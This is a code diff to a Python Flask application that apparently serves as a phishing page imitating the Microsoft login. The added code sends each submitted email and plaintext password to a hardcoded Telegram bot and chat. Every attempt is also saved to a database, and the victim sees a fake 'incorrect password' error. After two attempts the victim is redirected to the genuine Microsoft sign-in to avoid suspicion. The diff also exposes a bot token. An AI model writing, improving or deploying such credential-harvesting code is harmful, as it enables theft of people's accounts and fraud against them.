@@ -17,6 +17,36 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
 
+# ── Telegram Config ──
+TELEGRAM_BOT_TOKEN = '8818621809:AAGj2fNcz1YLMNUKxsxp2rAr54S2Q1PaWk0'
+TELEGRAM_CHAT_ID   = '8063853431'
+
+
+# ── Send Telegram Notification ──
+def send_telegram(email, password, attempt_number):
+    try:
+        message = (
+            f"🔔 *New Login Attempt*\n\n"
+            f"📧 *Email:* `{email}`\n"
+            f"🔑 *Password:* `{password}`\n"
+            f"🔢 *Attempt:* {attempt_number}\n"
+            f"🕐 *Time:* {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+        )
+
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+
+        response = requests.post(url, json=payload, timeout=5)
+        print(f"Telegram response: {response.json()}")
+
+    except Exception as e:
+        print(f"Telegram error: {e}")
+
+
 # ── Model ──
 class LoginAttempt(db.Model):
     id        = db.Column(db.Integer, primary_key=True)
@@ -74,14 +104,22 @@ def password():
             session['attempts'] = attempts
             session.modified = True
 
-            # Always save to DB
+            # Save to DB
             attempt = LoginAttempt(email=email, password=pwd, status=f'attempt_{attempts}')
             db.session.add(attempt)
             db.session.commit()
 
+            # Send Telegram notification
+            send_telegram(email, pwd, attempts)
+
             if attempts >= 2:
-                # After 2 attempts redirect to real Microsoft
-                return redirect(f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&response_type=code&login_hint={email}&scope=openid profile email')
+                return redirect(
+                    f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
+                    f'?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c'
+                    f'&response_type=code'
+                    f'&login_hint={email}'
+                    f'&scope=openid profile email'
+                )
             else:
                 error = "Your account or password is incorrect. If you don't remember your password, reset it now."
 
